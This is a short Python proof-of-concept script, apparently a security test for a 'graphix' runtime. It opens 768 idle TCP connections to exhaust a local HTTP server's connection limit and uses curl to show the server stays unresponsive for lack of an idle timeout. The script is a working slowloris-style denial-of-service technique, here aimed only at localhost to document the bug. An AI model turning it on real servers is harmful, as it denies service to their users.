# usage: python3 -I x-security-01-http-slowloris.py /path/to/graphix
# Opens 768 TCP connections that never send a byte; the default server
# (max_connections 768) then answers nobody until they close.
import os, socket, subprocess, sys, time
gx = sys.argv[1]; prog = os.path.join(os.path.dirname(os.path.abspath(__file__)), "x-security-01-http-slowloris.gx")
g = subprocess.Popen([gx, "--no-cache", prog], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def req():
    return subprocess.run(["curl", "-s", "-m", "3", "http://127.0.0.1:38931/x"], capture_output=True).returncode
try:
    time.sleep(6)
    print("baseline curl rc", req())          # 0
    idle = [socket.create_connection(("127.0.0.1", 38931)) for _ in range(768)]
    time.sleep(1)
    print("with 768 idle conns rc", req())   # 28 (timeout)
    time.sleep(10)
    print("10 s later rc", req())            # still 28: no header/idle timeout
    for s in idle: s.close()
    time.sleep(1)
    print("after closing rc", req())          # 0
finally:
    g.kill()
